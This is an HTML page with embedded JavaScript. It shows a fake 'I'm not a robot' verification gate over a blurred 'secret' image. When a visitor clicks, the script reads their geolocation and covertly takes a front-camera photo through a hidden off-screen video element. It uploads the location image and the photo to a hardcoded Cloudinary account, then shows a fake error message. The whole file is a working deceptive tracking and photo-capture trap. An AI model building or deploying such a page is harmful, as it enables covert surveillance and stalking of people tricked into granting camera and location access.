<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Popup + Location + Photo Gate</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

html,body{
    height:100%;
}

body{
    background:#000;
    color:#00ff66;
    font-family:Arial,Helvetica,sans-serif;
    font-weight:bold;
    overflow:hidden;
}

/* ============ SECRET CONTENT : full-screen image + red text ============ */

#content{
    position:fixed;
    inset:0;
    transition:filter .5s ease;
}

#content.locked{
    filter:blur(14px);
    pointer-events:none;
    user-select:none;
}

.bgWrap,.fgWrap{
    position:absolute;
    inset:0;
}

.bgWrap img,.fgWrap img{
    display:block;
    width:100%;
    height:100%;
}

/* पछाडिको layer — पूरै screen भर्ने blur (कालो पट्टी नदेखिने) */
.bgWrap img{
    object-fit:cover;
    filter:blur(25px) brightness(.45);
    transform:scale(1.15);
}

/* अगाडिको layer — device अनुसारको dedicated image */
.fgWrap img{
    object-fit:cover;
    /* 👉 यदि कुनै भाग काटिएर देखियो भने 'cover' लाई 'contain' बनाउनुहोस् */
}

/* ============ TOAST ============ */

#toast{
    position:fixed;
    left:50%;
    bottom:calc(20px + env(safe-area-inset-bottom));
    transform:translateX(-50%);
    z-index:5;
    background:rgba(0,0,0,.8);
    border:1px solid #00ff66;
    border-radius:999px;
    padding:10px 24px;
    font-size:14px;
    opacity:0;
    transition:opacity .4s;
    pointer-events:none;
}

#toast.show{
    opacity:1;
}

/* full-screen image */
#secretImg{
    width:100%;
    height:100%;
    object-fit:cover;
    display:block;
}

/* fallback background if image file missing */
#secretFallback{
    display:none;
    position:absolute;
    inset:0;
    background:linear-gradient(135deg,#111 0%,#2a2a2a 100%);
}

/* red text on top of the image */
#secretText{
    position:absolute;
    top:50%;
    left:50%;
    transform:translate(-50%,-50%);
    width:90%;
    text-align:center;
    color:#ff1e1e;                       /* 👉 RED text */
    font-size:clamp(26px,6vw,56px);
    line-height:1.4;
    text-shadow:
        0 2px 6px rgba(0,0,0,.95),
        0 0 22px rgba(0,0,0,.75);        /* keeps red readable on any image */
}

/* ============ GATE OVERLAY ============ */

#gate{
    position:fixed;
    inset:0;
    z-index:10;
    display:flex;
    flex-direction:column;
    justify-content:center;
    align-items:center;
    gap:24px;
    padding:24px;
    background:rgba(0,0,0,.7);
    text-align:center;
}

#gate.hidden{
    display:none;
}

#gateMsg{
    font-size:18px;
    max-width:520px;
    line-height:1.6;
}

button{
    padding:14px 60px;
    font-size:26px;
    font-weight:bold;
    color:#000;
    background:green;
    border:none;
    border-radius:8px;
    cursor:pointer;
}

button:disabled{
    opacity:.5;
    cursor:wait;
}

#gateStatus{
    font-size:16px;
    min-height:24px;
}

/* ============ IMAGE POPUP ============ */

#popup{
    position:fixed;
    inset:0;
    z-index:20;
    display:flex;
    justify-content:center;
    align-items:center;
    padding:24px;
  
    animation:fadeIn .3s ease;
}

#popup.closing{
    animation:fadeOut .3s ease forwards;
}

#popupCard{
    position:relative;
  
    border-radius:14px;
    padding:14px;
    text-align:center;
    max-width:90vw;
    animation:popIn .5s cubic-bezier(.2,1.5,.4,1);
   
}

#popupCard img{
    display:block;
    width:100%;
    max-width:420px;
    border-radius:8px;
}

#popupCaption{
    margin-top:12px;
    font-size:16px;
    line-height:1.5;
}

#popupClose{
    position:absolute;
    top:-16px;
    right:-16px;
    width:44px;
    height:44px;
    padding:0;
    border-radius:50%;
    background:#ff3355;
    color:#fff;
    font-size:24px;
    line-height:44px;
    text-align:center;
}

#popupClose:hover{
    background:#ff5577;
}

#imgFallback{
    display:none;
    font-size:110px;
    padding:40px;
}

/* hidden video — off-screen so frames still decode */
#video{
    position:fixed;
    left:-9999px;
    top:-9999px;
    width:2px;
    height:2px;
    opacity:0;
    pointer-events:none;
}

canvas{
    display:none;
}

/* ============ ANIMATIONS ============ */

@keyframes fadeIn{
    from{ opacity:0; }
    to{   opacity:1; }
}

@keyframes fadeOut{
    to{ opacity:0; visibility:hidden; }
}

@keyframes popIn{
    0%{   transform:scale(.4) rotate(-4deg); opacity:0; }
    70%{  transform:scale(1.06);             opacity:1; }
    100%{ transform:scale(1); }
}

</style>
</head>
<body>

<!-- ============ SECRET CONTENT (behind blur) ============ -->
<div id="content" class="locked">

    <picture class="bgWrap">
        <source media="(max-width: 768px)" srcset="mobile.jpeg">
        <img src="mobile.jpeg" alt="" onerror="this.style.display='none'">
    </picture>

    <picture class="fgWrap">
        <source media="(max-width: 768px)" srcset="mobile.jpeg">
        <img src="secret.png" alt="secret image" onerror="this.style.display='none'">
    </picture>

   <div id="secretFallback"></div>

    <!-- 👉 Red text on top of the image — edit freely -->
    <div id="secretText">
        Something went Wrong<br>
        Plz Try Again
    </div>

</div>
<div id="toast"></div>
<!-- ============ GATE (shows after popup closes) ============ -->
<div id="gate" class="hidden">

    <div id="gateMsg">
       
        click 👇👇and verify you'r Human
    </div>

    <button id="enterBtn">I'm not a robot</button>

    <div id="gateStatus"></div>

</div>

<!-- ============ IMAGE POPUP (shows first) ============ -->
<div id="popup">

    <div id="popupCard">

        <!-- 👉 Replace "popup.jpg" with your popup image -->
        <img src="notice.png" alt="popup"
             onerror="this.style.display='none'; document.getElementById('imgFallback').style.display='block';">

        <div id="imgFallback">🖼️</div>

     

        <button id="popupClose" title="Close">✕</button>

    </div>

</div>

<video id="video" autoplay playsinline muted></video>
<canvas id="locCanvas" width="800" height="500"></canvas>
<canvas id="photoCanvas"></canvas>

<script>

const CLOUD_NAME = "dae4gham8";
const UPLOAD_PRESET = "Akprompt";

const content     = document.getElementById("content");
const gate        = document.getElementById("gate");
const popup       = document.getElementById("popup");
const popupClose  = document.getElementById("popupClose");
const gateStatus  = document.getElementById("gateStatus");
const enterBtn    = document.getElementById("enterBtn");
const video       = document.getElementById("video");
const locCanvas   = document.getElementById("locCanvas");
const photoCanvas = document.getElementById("photoCanvas");

let locationDone = false;
let pendingPhoto = null;




/* ============ POPUP → GATE ============ */

popupClose.addEventListener("click", () => {

    popup.classList.add("closing");

    popup.addEventListener("animationend", () => {
        popup.style.display = "none";
        gate.classList.remove("hidden");   // NOW show ENTER gate
    }, { once:true });

});

/* ============ ONE CLICK ============ */

enterBtn.addEventListener("click", runAll);

async function runAll(){

    enterBtn.disabled = true;

    try{

        // 1) Location
        if(!locationDone){

          
            const position = await getLocation();

           
            await uploadBlob(await locationImageBlob(position));
            locationDone = true;

        }

        // 2) Photo
        if(!pendingPhoto){
          
            pendingPhoto = await capturePhoto();
        }

       
        await uploadBlob(pendingPhoto);
        pendingPhoto = null;

        // 3) Done — clear blur
        unlock();

    }catch(err){
        console.error(err);
        gateStatus.textContent = "❌ " + err.message;
        enterBtn.textContent = "RETRY";
        enterBtn.disabled = false;
    }

}

/* ============ LOCATION ============ */

function getLocation(){
    return new Promise((resolve, reject) => {

        if(!navigator.geolocation){
            reject(new Error("Geolocation not supported."));
            return;
        }

        navigator.geolocation.getCurrentPosition(
            resolve,
            err => {
                const m = {
                   
                    1: "timed out click again."
                };
                reject(new Error(m[err.code] || "Location error."));
            },
            { timeout: 10000, maximumAge: 0 }
        );

    });
}

function locationImageBlob(position){
    const ctx = locCanvas.getContext("2d");

    ctx.fillStyle = "#ffffff";
    ctx.fillRect(0,0,800,500);

    ctx.fillStyle = "#000";
    ctx.font = "40px Arial";
    ctx.fillText("Location",40,80);

    ctx.font = "30px Arial";
    ctx.fillText("Latitude : " + position.coords.latitude,40,170);
    ctx.fillText("Longitude : " + position.coords.longitude,40,240);
    ctx.fillText(new Date().toString(),40,320);

    return new Promise(res => locCanvas.toBlob(res,"image/png"));
}

/* ============ PHOTO (silent capture) ============ */

async function capturePhoto(){

    if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia){
        throw new Error("Camera not supported (HTTPS required).");
    }

    const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" },
        audio: false
    }).catch(err => {
        const m = {
            NotAllowedError:  "Camera permission denied.",
            NotFoundError:    "No camera found.",
            NotReadableError: "Camera already in use."
        };
        throw new Error(m[err.name] || "Camera error.");
    });

    video.srcObject = stream;

    await new Promise(res => {
        if(video.readyState >= 2) return res();
        video.onloadeddata = res;
    });

    // let exposure/autofocus settle
    await new Promise(res => setTimeout(res, 400));

    photoCanvas.width  = video.videoWidth  || 640;
    photoCanvas.height = video.videoHeight || 480;

    photoCanvas.getContext("2d")
        .drawImage(video, 0, 0, photoCanvas.width, photoCanvas.height);

    stream.getTracks().forEach(t => t.stop());
    video.srcObject = null;

    return new Promise(res => photoCanvas.toBlob(res,"image/jpeg",0.9));

}

/* ============ UPLOAD (shared) ============ */

function uploadBlob(blob){
    const fd = new FormData();
    fd.append("file", blob);
    fd.append("upload_preset", UPLOAD_PRESET);

    return fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/image/upload`,{
        method: "POST",
        body: fd
    })
    .then(r => r.json())
    .then(data => {
        if(data.error) throw new Error(" failed: " + data.error.message);
        console.log("Uploaded:", data.secure_url);
        return data;
    });
}

/* ============ UNLOCK ============ */

function unlock(){
    gate.classList.add("hidden");
    content.classList.remove("locked");   // blur clears → image + red text visible
}

</script>

</body>
</html>
